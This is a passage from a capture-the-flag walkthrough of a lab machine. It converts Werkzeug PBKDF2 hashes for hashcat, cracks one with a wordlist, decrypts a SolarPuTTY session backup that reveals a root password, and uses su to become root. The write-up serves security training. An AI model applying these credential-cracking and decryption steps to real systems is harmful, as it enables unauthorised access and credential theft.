    m = re.match(r'pbkdf2:sha256:(\d*)\$([^\$]*)\$(.*)', h)
    iterations =  m.group(1)
    salt = m.group(2)
    hashe = m.group(3)
    print(f"sha256:{iterations}:{base64.b64encode(salt.encode()).decode()}:{base64.b64encode(codecs.decode(hashe,'hex')).decode()}")

```

It takes a file with one hash per line and converts it:

```

oxdf@hacky$ python werkzeug_to_hashcat.py wallet_users.hashes | tee wallet_users_hashcat.hashes
sha256:600000:STViRnliMFp6RDY5cE5YOA==:6eTqXCgOB2ZhIpWrm/8y5fod6PbLtlhvq3q3vHYr2Xg=
sha256:600000:WW5SZ2puaW0=:yVQajGrUC8Bkl5vERgJQQf+smvL3YnJpcdiignLFUO0=

```

#### hashcat

I’ll pass that file to `hashcat`:

```

$ hashcat wallet_users_hashcat.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF
...[snip]...
sha256:600000:WW5SZ2puaW0=:yVQajGrUC8Bkl5vERgJQQf+smvL3YnJpcdiignLFUO0=:estrella
...[snip]...

```

The cracking is very slow, but it does find the shirohige user’s password as “estrella” within a couple minutes. The other doesn’t crack in five minutes so I can assume it’s not necessary for the box.

This doesn’t work for a root password, but is the password for the SolarPuTTY backup.

#### SolarPuttyDecrypt

I’ll download the [SolarPuttyDecrypt release](https://github.com/VoidSec/SolarPuttyDecrypt/releases/tag/v1.0) and unzip it. It has a `.exe` file, but will run with `mono` on my Linux host:

```

oxdf@hacky$ mono SolarPuttyDecrypt.exe ../sessions-backup.dat estrella
-----------------------------------------------------
SolarPutty's Sessions Decrypter by VoidSec
-----------------------------------------------------

{
  "Sessions": [
    {
      "Id": "066894ee-635c-4578-86d0-d36d4838115b",
      "Ip": "10.10.11.37",
      "Port": 22,
      "ConnectionType": 1,
      "SessionName": "Instant",
      "Authentication": 0,
      "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
      "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
      "LastTimeOpen": "0001-01-01T00:00:00",
      "OpenCounter": 1,
      "SerialLine": null,
      "Speed": 0,
      "Color": "#FF176998",
      "TelnetConnectionWaitSeconds": 1,
      "LoggingEnabled": false,
      "RemoteDirectory": ""
    }
  ],
  "Credentials": [
    {
      "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
      "CredentialsName": "instant-root",
      "Username": "root",
      "Password": "12**24nzC!r0c%q12",
      "PrivateKeyPath": "",
      "Passphrase": "",
      "PrivateKeyContent": null
    }
  ],
  "AuthScript": [],
  "Groups": [],
  "Tunnels": [],
  "LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}
-----------------------------------------------------
[+] DONE Decrypted file is saved in: /home/oxdf/Desktop\SolarPutty_sessions_decrypted.txt

```

### su

The password doesn’t work for SSH as root as root is blocked from SSH access, but it works fine with `su` from my current SSH session as shirohige:

```

shirohige@instant:~$ su -
Password: 
root@instant:~#

```

There I can grab `root.txt`:

```

root@instant:~# cat root.txt
744b5dfd************************

```